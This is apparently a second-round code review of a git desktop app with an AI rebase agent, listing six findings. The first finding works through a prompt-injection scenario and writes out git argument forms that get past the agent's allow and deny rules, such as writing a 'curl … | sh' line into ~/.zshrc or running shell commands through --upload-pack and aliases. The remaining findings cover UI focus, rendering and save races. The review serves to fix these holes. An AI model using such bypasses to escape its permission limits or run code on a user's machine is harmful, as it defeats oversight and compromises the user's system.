# Code review round 2 (R1 fixes)

Base `bb2f5852c` (`docs(v2.2): code review round 1 findings`). Head `f67a428e1`. Scope:
`git diff bb2f5852c..HEAD`, 15 commits (R1 fixes `817ff2d00`..`cd51f214a`, `296236ddf`, close-out
`f67a428e1`). All treated as unreviewed. Three dimensions: architecture/security, correctness,
performance.

6 findings: 0 high, 2 med, 4 low. Grouped by root cause; one commit per group.

## Group A: rebase agent tool grant (R1 #5 fix)

### 1. med (security): allowed git subcommands still run commands and write outside the worktree

`apps/kira-space/internal/ade/rebase.go:36-63`, `apps/kira-space/internal/ade/runs.go:633-635`.
The allowlist passes argument forms that run code or write files anywhere. The deny list is
prefix-only and is easy to get around.

- `git log --output=$HOME/.zshrc --format='curl … | sh' -1` (also `git show`, `git diff`). This
  writes a file anywhere, with content the agent chooses. The next shell runs it.
- `git fetch --upload-pack='sh -c …' .` runs the command through the shell. With push on,
  `git push --force-with-lease --receive-pack=…` (or `--exec=`) does the same.
- `git rebase --ex='sh -c …' HEAD~1`: git accepts unique long-option prefixes, so `--ex` is not
  caught by `Bash(git rebase --exec:*)`. The stuck short form `-xsh…` is not caught by
  `git rebase -x:*` either.
- The run is not `Isolated`, so `settingSources()` loads user (and project/local) settings, and
  their allow rules add to `--allowedTools`. A user with `Bash(git:*)` or `Bash` allowed gets the
  old grant back. Only the deny list is left, and `git -C . -c alias.x='!sh …' x`,
  `git --config-env=…` and `git -C . push` all get past it.

Scenario: a conflicted file carries a prompt injection, the same R1 #5 threat. The agent runs the
`git log --output` line with no permission prompt, and the user's next terminal runs the payload.

Fix: do not give the agent `Bash(git …)` at all. Expose the few operations the rebase needs as
tools on the existing agent MCP server (status, diff, add/rm path, checkout --ours/--theirs path,
rebase --continue/--skip/--abort, push of named branches). Each tool builds its own argv. If Bash
stays, launch the rebase with `SettingSources: ""` so user and project allow rules cannot widen the
grant. Also deny `--output`, `--upload-pack`, `--receive-pack`, `--exec`/`--ex`/`-x` in every
position.

### 2. med: restacking a multi-branch stack is denied

`apps/kira-space/internal/ade/rebase.go:36-41`, `apps/kira-space/internal/ade/rebaseprompt.go:29-38`,
`apps/kira-space/internal/ade/rebase.go:557`. The agent starts in `root.Worktree`. The prompt
then says "In <child worktree>: git rebase --onto …" for every stacked branch. That needs
`git -C <wt> …` or `cd <wt> && git …`. `git -C` matches no allow rule. A `cd` outside the session's
directories needs permission, which `-p` denies. Before the fix, `Bash(git:*)` allowed `git -C`.
The flow tests use `fakeagent` `Sh`, which never checks permissions, so this goes unseen.

Scenario: rebase branch A with B stacked on it. A rebases. Every command for B is denied. The
agent reports a failure or stops, and B is left on A's old tip.

Fix: with the MCP tools from #1, take the worktree as an argument and check it against
`spec.Stack`. If Bash stays, pass each stack worktree with `--add-dir` and allow
`Bash(git -C <wt> <sub>:*)` for each exact stack path. Add a flow assertion on the args the fake
agent records (`*.args`) that each stack worktree is reachable.

## Group B: review commit list virtualization (R1 #3 fix)

### 3. low: focused row unmounts on mouse scroll; keyboard navigation goes dead

`packages/git-ui/src/components/review/ReviewView.vue:637-664`, `:1019-1052`. Wheel-scroll the
focused row out of the overscan window. Vue removes its element, so focus falls to `<body>`.
`onRowsKeydown` sits on the `role="tree"` container and gets no more keys. The new
`:tabindex="focusedRowMounted ? -1 : 0"` makes the container focusable, but nothing moves focus
there. Mounted `treeitem`s also have no `aria-setsize`/`aria-posinset`, so a screen reader counts
only the mounted rows.

Scenario: focus a row, wheel down 200 commits, press ArrowDown. Nothing happens until the user
clicks a row. Before the fix every row stayed mounted.

Fix: when the focused row is about to leave `virtualItems` while it holds focus, move focus to
`rowsEl` with `preventScroll` (the keydown handler already works from `focusedRow`). Or keep the
focused index mounted with a custom `rangeExtractor`. Set `aria-setsize="shas.length"` and
`aria-posinset="index + 1"` on each row.

## Group C: git graph chunk invalidation (R1 #6 fix)

### 4. low: selective `handleChunkLayout` invalidation saves nothing and adds a render

`packages/git-ui/src/components/CommitGrid.vue:681-701`, `:1082-1086`;
`packages/git-ui/src/state/graphView.ts:517-551`, `:628-636`. `#rebuildLayout` lays out the whole
store again and publishes a new `plan` on every relayout. The `plan` watcher calls
`grid.invalidate()` (all rows) before the drain loop calls the listener. `handleChunkLayout` then
invalidates a subset and calls `render()` again. The new comment says only rendered rows inside
`range` change. That is false: a relayout can move lanes and display rows anywhere. It looks
correct only because the plan watcher already rebuilt everything.

Scenario: a 200k-row stream still does one full row teardown per relayout, which R1 #6 asked to
remove, plus a second render pass. A maintainer who trusts the comment and drops the plan watcher's
`invalidate()` leaves stale rows.

Fix: pick one path. Either drop the invalidation and `render()` from `handleChunkLayout` (keep
`raiseLaneFloor` and the layout mark) and say the plan watcher owns repaint, or make the plan
watcher skip the full invalidate when only the row count grew and rely on a correct range. Fix the
comment to match.

## Group D: folder hide re-apply (R1 #12 fix)

### 5. low: post-scan re-apply writes a stale folder flag over later changes

`apps/kira-space/internal/ade/repoconfig.go:353-358`. The re-apply reads `FolderHidden`, then
calls `SetFolderHidden(path, now)` in a separate transaction. That call rewrites
`ade_folders.hidden` and every repo from the folder.

Scenario 1: the scan reads `now = true`. The user then clicks Show on the folder, and the re-apply
writes `true` back, so the folder ends up hidden against the last click. Scenario 2: the folder is
hidden mid-scan, and the user unhides one repo of it before the scan ends. The re-apply hides that
repo again.

Fix: set only the rows this scan imported, from the flag as stored, in one statement:
`UPDATE code_repos SET hidden = (SELECT hidden FROM ade_folders WHERE path = ?) WHERE id IN (…imported)`.
Never write `ade_folders` from the scan.

## Group E: workflow save concurrency (R1 #15 fix)

### 6. low: YAML editor Save still overwrites a workflow changed elsewhere

`apps/kira-space/frontend/src/ade/v2/workflows/AdeWorkflowYaml.vue:57-66`,
`apps/kira-space/internal/adeflow/writer.go:71-85`. R1 #15's own scenario included "the YAML file
is edited on disk". The fix covers the graph editor only. The YAML editor ignores pushes while
dirty, and `SaveYaml` writes the text with no base check. The R1 result notes the gap, but it was
not raised with the user and is not in Known open items. That narrows the ask.

Scenario: window 1 has unsaved YAML edits. Window 2 saves the same workflow from the graph editor.
Window 1 saves, and window 2's change is silently lost.

Fix: add `baseHash` to `SaveWorkflowYamlArgs`, check it in `SaveYaml` under `wmu` exactly as in
`Save`, keep the hash in the YAML editor's draft (from `entry.hash`, refreshed by pushes while
clean), and reuse the Reload / Overwrite affordance. Add a flow assertion and a UI spec, same split
as the graph editor.

## Areas checked, nothing real found

- Scheduler (`internal/scriptruns/scheduler.go`): a 30 s cap plus a wall-clock re-read fixes the
  sleep case. No double fire, because `advance` steps from `e.next`. A backward clock jump waits for
  the next wall-clock instant, with no refire. One 30 s timer has negligible wake cost. In the test,
  the sleep scenario alone also passes on the old code; only the `waits[0] <= maxWait` assertion
  guards the fix. That is enough.
- `--disallowedTools` precedence: a deny beats an allow in Claude Code, as `Spec` says. #1 is about
  what the rules fail to match, not about precedence.
- `lastRepoKey`: the window key is a persisted UUID, so it survives relaunch. A stale or closed repo
  falls back through `openRepos.includes`. Keys are per window, so windows do not cross-write.
  `closeRepoWorkspace` clears it.
- repoTabs reuse: the `isPreview` guard matches `createTabsStore.reuseExistingTab`. Pinned promotion
  is unchanged.
- Hide not-found: `ErrCodeRepoNotFound` is wrapped with `%w` and mapped to `E_NOT_FOUND` for both
  hide and colour.
- Docker alias restore: the original endpoint (IPAM, driver opts, aliases) reconnects on a fresh
  context, and `restored` is reported. A test with a fake engine is justified.
- Disk cache prune, inline `fill: none`, weight guard path, `RepoFileView` heading weight,
  `contract.go` comment, Studio `mockRuntime` bindings.
- Deleted tests (`validate.test.ts`, four migration default tests) restate the code. Nothing of
  value is lost.
- Tests added: scheduler stall, Docker reattach, repo-tab cohort rules, hide not-found (flow), and
  last-active and workflow conflict (UI, paired with a flow test). All are within CLAUDE.md rules.
- ARCHITECTURE.md: the Docker cache item and the 600-commit load-sensitive entry are removed
  correctly. The `lastRepoKey` text is accurate. Missing: #6 (until fixed).
